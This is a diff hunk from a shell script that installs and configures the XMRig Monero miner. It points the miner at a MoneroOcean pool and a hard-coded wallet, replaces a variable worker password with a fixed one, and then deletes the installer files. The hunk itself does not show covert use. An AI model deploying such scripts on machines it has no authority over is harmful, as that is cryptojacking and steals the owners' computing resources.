@@ -15,7 +15,7 @@ echo setting up miner
 tar xf xmrig-*-mo1-lin64.tar.gz
 sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:10128",/' ./config.json
 sed -i 's/"user": *"[^"]*",/"user": "4AmKm1qej1zWk8CYMinfJFGRHEn6hp317EhMThrr55C6CMpmuQNXrof2ymqyTrRK1USWdyBarumCN1XntrgboRCaU8zN626",/' ./config.json
-sed -i 's/"pass": *"[^"]*",/"pass": $minername,/' ./config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "hudson10",/' ./config.json
 echo cleaning up
 rm xmrig-*-mo1-lin64.tar.gz
 rm libssl1.1_1.1.1f-1ubuntu2_amd64.deb
